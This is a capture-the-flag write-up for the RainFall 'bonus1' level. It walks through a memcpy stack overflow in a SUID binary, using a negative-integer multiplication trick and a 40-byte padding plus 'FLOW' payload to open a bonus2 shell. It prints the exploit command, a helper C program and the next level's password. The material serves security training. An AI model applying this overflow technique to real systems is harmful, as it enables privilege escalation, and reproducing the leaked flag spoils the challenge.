# Level bonus 1

## Vulnerability

memcpy() buffer overflow

## Context

We find a binary with owner ```bonus2``` and SUID.
```
bonus1@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
```
When run with no arguments it segfaults. with any number of random arguments it does nothing.
```
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 hi
bonus1@RainFall:~$
```

## Solution

Investigating with gdb we find only ```main()```, no other functions. ```main()``` calls ```memcpy()``` which is vulnerable to buffer overflow.

First ```main()``` reads the first argument ```n = atoi(argv[1])```, and exits the program if ```n``` not less than 10. So any number less than 10, easy!

Next ```memcpy()``` copies ```n``` * 4 bytes from ```argv[2]``` to a buffer on the stack with the potential to overflow ```n```.

Finally, if now ```n``` == 0x574f4c46 ("FLOW" in ascii) a shell is opened.

So we want to use ```memcpy()``` to overflow ```n``` with 0x574f4c46. The problem is ```n``` <= 9, ```memcpy()``` copies ```n``` * 4 bytes, 9 * 4 = 36. Not long enough to reach and overwrite ```n```, 44 bytes minimum. The solution is to use a negative number which when multiplied by 4 is at least 44 (n * 4 => 44).

### Find n (first argument)

We can write a simple c program ```find_n.c``` to find an ```n``` which works for us.
```
/*
	find_n.c
*/
#include <stdio.h>
#include <limits.h>

int	main(void)
{
	int	n;

	n = INT_MIN;
	while (n < 0)
	{
		if (n * 4 >= 44)
		{
			printf("n = %d, n * 4 = %d\n", n, n * 4);
			break ;
		}
		n++;
	}
	return (0);
}
```
Compiled and run with ```gcc find_n.c -o find_n; ./find_n``` it outputs:
```
n = -2147483637, n * 4 = 44
```

### Build overflow string

So our first argument ```n``` is ```-2147483637```

And our second argument:
1. 40 bytes padding to reach the address of ```n``` - ```$(python -c 'print "A" * 40'```
2. target value ```n``` to open shell, 0x574f4c46 = "FLOW" in ascii - ```"FLOW"```
```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## Recreate Exploited Binary

As user ```bonus2```, in ```/tmp```, create and compile ```bonus1_source.c```
```
bonus2@RainFall:/tmp$ gcc bonus1_source.c -fno-stack-protector -o bonus1_source
```

Edit permissions including suid, then move the binary to home directory.
```
bonus2@RainFall:/tmp$ chmod u+s bonus1_source; chmod +wx ~; mv bonus1_source ~
```

Exit back to user ```bonus1```, then provide our exploit arguments to the source.
```
bonus2@RainFall:/tmp$ exit
exit
bonus1@RainFall:~$ /home/user/bonus2/bonus1_source -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
$ whoami
bonus2
```
